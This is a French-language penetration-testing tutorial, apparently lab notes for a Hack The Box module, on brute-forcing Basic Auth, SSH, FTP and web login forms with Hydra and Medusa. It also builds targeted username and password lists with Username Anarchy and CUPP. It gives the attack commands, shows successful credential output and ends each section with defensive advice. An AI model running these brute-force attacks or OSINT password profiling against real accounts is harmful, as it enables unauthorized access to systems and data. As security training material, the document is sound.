🔐 Login Brute Force (Basic Auth)

🎯 Définition

Une attaque par brute-force consiste à tester automatiquement un grand nombre de combinaisons de mots de passe afin de compromettre un compte. Dans le cas du Basic HTTP Authentication, l’attaquant envoie en boucle des identifiants jusqu’à trouver les bons.

⚠️ Impact

  • Accès non autorisé à des comptes
  • Exposition de données sensibles
  • Escalade de privilèges

🧠 Pourquoi c’est vulnérable

Le Basic Auth repose sur un simple encodage Base64 des identifiants. Sans mécanisme de protection comme le rate limiting ou un CAPTCHA, il devient trivial d’automatiser des milliers de tentatives.

🔍 Fonctionnement

  • Le serveur renvoie 401 Unauthorized
  • Le navigateur demande des identifiants
  • Les credentials sont encodés en Base64
  • Envoyés dans le header Authorization
Authorization: Basic YWxpY2U6c2VjcmV0MTIz

🛠️ Outil : Hydra

Hydra est un outil de brute-force très utilisé en pentest. Il permet d’attaquer plusieurs services comme HTTP, SSH, FTP ou encore les formulaires web.

🚀 Exploitation avec Hydra

1. Télécharger une wordlist

curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt

2. Lancer l’attaque

hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81

3. Explication

  • -l : utilisateur connu
  • -P : liste de mots de passe
  • http-get : attaque Basic Auth
  • -s : port cible

🧪 Résultat

[http-get] host: 127.0.0.1   login: basic-auth-user   password: ******

✅ Hydra identifie automatiquement les identifiants valides après plusieurs tentatives.

🛡️ Prévention

  • Limiter le nombre de tentatives (rate limiting)
  • Implémenter un CAPTCHA
  • Activer la MFA (authentification multi-facteurs)
  • Utiliser HTTPS
  • Surveiller les logs

🛠️ Outil : Medusa

🎯 Présentation

Medusa est un outil de brute‑force rapide, modulaire et hautement parallèle, utilisé en cybersécurité pour tester la robustesse des mécanismes d’authentification à distance.

Il permet de vérifier la résistance de nombreux services exposés (SSH, FTP, HTTP, RDP, bases de données, e‑mail, etc.) face aux attaques par dictionnaire ou credential stuffing.

📥 Installation

Medusa est souvent préinstallé sur les distributions orientées pentest. Sinon, l’installation est simple : 

sudo apt update
sudo apt install medusa

Vérification :

medusa -h

⚙️ Syntaxe générale

medusa [options_cible] [options_identifiants] -M module [options_module]
  • -h / -H : cible unique ou liste de cibles
  • -u / -U : utilisateur ou liste d’utilisateurs
  • -p / -P : mot de passe ou wordlist
  • -M : module correspondant au service
  • -t : nombre de tentatives parallèles
  • -f : arrêt après la première réussite
  • -v : niveau de verbosité

🧩 Services supportés

  • SSH – Accès distant sécurisé
  • FTP – Transfert de fichiers
  • HTTP / Web forms – Authentification web
  • RDP – Bureau à distance Windows
  • MySQL – Bases de données
  • IMAP / POP3 – Serveurs de messagerie
  • Telnet – Services legacy
  • VNC – Accès graphique distant

🚀 Exemple : test SSH

Évaluation de la sécurité d’un serveur SSH à l’aide d’une liste d’utilisateurs et de mots de passe : 

medusa -h 192.168.0.100 -U usernames.txt -P passwords.txt -M ssh

Medusa teste automatiquement chaque combinaison afin d’identifier d’éventuels comptes faibles.

🌐 Exemple : HTTP Basic Authentication

Test d’authentification basique sur plusieurs serveurs web : 

medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET

🧪 Détection de mots de passe faibles

Medusa peut également tester des configurations dangereuses comme :

  • Mot de passe vide
  • Mot de passe identique au nom d’utilisateur
medusa -h 10.0.0.5 -U usernames.txt -e ns -M ssh

🛡️ Prévention

  • Limiter le nombre de tentatives de connexion
  • Mettre en place un délai après échecs
  • Utiliser des mots de passe forts et uniques
  • Activer l’authentification multi‑facteurs (MFA)
  • Surveiller activement les logs d’accès

🔎 Exploitation pratique avec Medusa (SSH & FTP)

Dans un paysage cybersécuritaire en constante évolution, la robustesse des mécanismes d’authentification est cruciale. Malgré l’utilisation de protocoles réputés comme SSH et FTP, beaucoup de services reposent encore sur des couples nom d’utilisateur / mot de passe, ce qui les rend vulnérables aux attaques par brute‑force.

Cette démonstration illustre comment Medusa peut être utilisé pour compromettre successivement un service SSH puis un service FTP, mettant en évidence les failles liées aux mots de passe faibles et l’importance d’une authentification renforcée.

🔐 Rappel : SSH et FTP

SSH (Secure Shell) est un protocole cryptographique permettant l’accès distant sécurisé, l’exécution de commandes et le transfert de fichiers. Bien que chiffré, sa sécurité peut être compromise par des mots de passe faibles ou réutilisés.

FTP (File Transfer Protocol) est utilisé pour le transfert de fichiers sur un réseau. Dans sa version classique, les identifiants sont transmis en clair, ce qui en fait une cible privilégiée pour l’interception et le brute‑force.

🚀 Attaque du service SSH

En supposant que le nom d’utilisateur sshuser est connu, Medusa peut tester une liste de mots de passe courants afin d’identifier le bon identifiant. 

medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
  • -h : adresse IP de la cible
  • -n : port SSH (par défaut 22)
  • -u : utilisateur connu
  • -P : wordlist de mots de passe
  • -M ssh : module SSH
  • -t 3 : tentatives parallèles
ACCOUNT FOUND: [ssh] Host: IP User: sshuser Password: 1q2w3e4r5t [SUCCESS]

🔓 Accès au système

Une fois le mot de passe identifié, l’accès SSH est immédiat : 

ssh sshuser@<IP> -p <PORT>

L’attaquant dispose alors d’un accès interactif à la machine cible.

🔍 Extension de la surface d’attaque

Une analyse des ports ouverts permet d’identifier d’autres services exposés : 

netstat -tulpn | grep LISTEN
21/tcp open  ftp
22/tcp open  ssh

Le scan avec nmap confirme la présence d’un serveur FTP actif.

📂 Attaque du service FTP

La présence d’un compte ftpuser suggère un utilisateur FTP. Medusa peut alors être utilisé pour brute‑forcer l’accès : 

medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: ftpuser Password: ****** [SUCCESS]

📥 Récupération de données

Après authentification, l’accès FTP permet de récupérer des fichiers sensibles : 

ftp ftp://ftpuser:<FTP_PASSWORD>@localhost
ftp> ls
ftp> get flag.txt
cat flag.txt
HTB{...}

Cet exemple illustre la facilité avec laquelle des informations critiques peuvent être compromises en cas de mauvaise hygiène de sécurité.

🧠 Section 11 / 13 – Wordlists personnalisées (Custom Wordlists)

🎯 Pourquoi des wordlists personnalisées ?

Les wordlists génériques comme rockyou ou SecLists couvrent un large spectre de mots de passe et d’identifiants, mais restent peu efficaces lorsqu’une cible précise utilise des conventions internes spécifiques.

Lors d’un test d’intrusion ciblé, une approche sur mesure permet de réduire drastiquement le bruit et d’augmenter fortement le taux de succès en s’appuyant sur des informations contextuelles (OSINT).

👤 Exemple concret

Une cible nommée Thomas Edison n’utilisera probablement pas un identifiant générique présent dans une liste de plusieurs millions d’entrées. Les conventions peuvent inclure :

  • prenom.nom
  • nomprenom
  • nom + initiale
  • variantes tronquées

D’où l’intérêt de générer des listes adaptées à l’environnement de la cible.

🧩 Username Anarchy

Username Anarchy automatise la génération de noms d’utilisateurs à partir des prénoms et noms, en tenant compte des initiales, abréviations, séparateurs et variantes courantes.

📥 Installation

sudo apt install ruby -y
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy

🚀 Génération de noms d’utilisateur

./username-anarchy Jane Smith > jane_smith_usernames.txt

Le fichier généré inclut :

  • janesmith, smithjane
  • j.smith, jane.s
  • js, sj
  • Variantes en majuscules / mixtes

🔐 CUPP – Génération de mots de passe ciblés

CUPP (Common User Passwords Profiler) crée des wordlists de mots de passe hautement personnalisées à partir d’informations OSINT :

  • Réseaux sociaux
  • Données professionnelles
  • Famille, animaux, loisirs
  • Dates importantes

📥 Installation

sudo apt install cupp -y

⚙️ Mode interactif

cupp -i

CUPP applique automatiquement :

  • Leetspeak (a → 4, e → 3, i → 1)
  • Capitalisation
  • Ajout de chiffres et caractères spéciaux
  • Combinaisons avancées

📏 Filtrage selon une politique de mot de passe

Si l’entreprise impose une politique stricte (majuscules, chiffres, caractères spéciaux), il est possible de filtrer efficacement la wordlist générée : 

grep -E '^.{6,}$' jane.txt \
| grep -E '[A-Z]' \
| grep -E '[a-z]' \
| grep -E '[0-9]' \
| grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt

✅ Réduction massive de la taille de la wordlist tout en respectant la politique de sécurité.

🚀 Exploitation avec Hydra

Les deux wordlists générées peuvent alors être utilisées simultanément dans une attaque par formulaire HTTP : 

hydra -L jane_smith_usernames.txt -P jane-filtered.txt IP -s PORT \
http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"

✅ Cette méthode ciblée maximise l’efficacité tout en réduisant les tentatives inutiles.

🛡️ Leçon défensive

  • Éviter les conventions de noms prévisibles
  • Politiques de mots de passe robustes
  • Rate limiting & verrouillage de compte
  • MFA obligatoire
  • Surveillance des tentatives d’authentification

🛡️ Leçon de sécurité

  • Mots de passe longs, uniques et complexes
  • Désactivation de l’authentification par mot de passe (clé SSH)
  • Utilisation de SFTP au lieu de FTP
  • Rate limiting et bannissement IP
  • Surveillance active des logs
